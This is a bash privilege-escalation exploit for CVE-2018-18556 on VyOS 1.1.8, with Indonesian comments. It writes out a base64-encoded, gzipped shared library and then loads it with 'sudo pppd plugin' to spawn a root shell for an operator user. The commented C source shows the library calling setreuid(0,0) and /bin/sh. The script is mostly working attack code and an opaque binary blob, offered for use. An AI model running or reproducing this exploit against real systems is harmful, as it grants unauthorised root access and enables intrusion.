#!/bin/bash
# Author: Pler Kuda
# CVE: CVE-2018-18556
# Description: Manfaatkan opsi plugin pppd untuk memuat pustaka bersama yang berbahaya
#              untuk mengeksekusi shell sebagai root saat dipanggil oleh sudo sebagai pengguna operator.
#
#
# Perintah berikut digunakan untuk membuat pustaka terkompresi base64
# gumpal. Ini dilakukan karena kompiler tidak diinstal secara default di
# pda VyOS 1.1.8
#
#cat >woot.c<<EOF
##include <stdlib.h>
##include <sys/types.h>
##include <unistd.h>
#
#void woot(){
#  setreuid(0,0);
#  system("/bin/sh");
#}
##EOF
#
#
#gcc -fPIC -o woot.o -Wall -c woot.c
#gcc -Wall -shared -Wl,-soname,libwoot.so.1 -Wl,-init,woot -o libwoot.so.1 woot.o
#gzip -c libwoot.so.1|base64

B64LIB=$(mktemp)

cat >${B64LIB?}<<EOF
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
EOF

base64 -d ${B64LIB?} | gzip -cd > libwoot.so.1

sudo pppd plugin $PWD/libwoot.so.1
